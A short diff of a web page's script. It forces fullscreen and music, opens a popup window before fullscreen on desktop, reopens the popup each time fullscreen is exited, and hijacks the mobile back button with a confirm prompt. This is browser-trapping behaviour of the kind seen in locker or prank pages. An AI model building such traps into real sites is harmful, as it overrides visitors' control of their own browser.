@@ -278,28 +278,24 @@
         }
 
         function triggerFullScreen() {
-            // The alert for popups has been removed as requested.
+            // For desktop, open the first popup immediately.
+            if (!isMobileDevice) {
+                window.open('popup.html', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
+            }
 
+            // Then, proceed with fullscreen and music for all users.
             startSession();
             requestFullScreenMode();
             fullscreenContent.style.display = 'block';
             bgMusic.play();
             
-            // On desktop, open the first popup immediately.
-            // On mobile, this block is skipped, so no popups will appear.
-            if (!isMobileDevice) {
-                window.open('popup.html', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
-            }
-            
-            // For mobile devices (like in a Cordova/PhoneGap app), handle the back button.
+            // For mobile devices, handle the back button.
             if (isMobileDevice) {
                 document.addEventListener('backbutton', function(e) {
                     e.preventDefault();
                     if (confirm("Вы уверены, что хотите выйти?")) {
                         fullscreenContent.style.display = 'none';
                         bgMusic.pause();
-                        // Optionally, you might want to allow navigation back after this.
-                        // For now, it just hides the overlay.
                     }
                 }, false);
             }
@@ -318,7 +314,6 @@
                 if (!isMobileDevice) {
                     window.open('popup.html', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
                 }
-                // On mobile, do nothing special when fullscreen is exited.
             }
         });
 
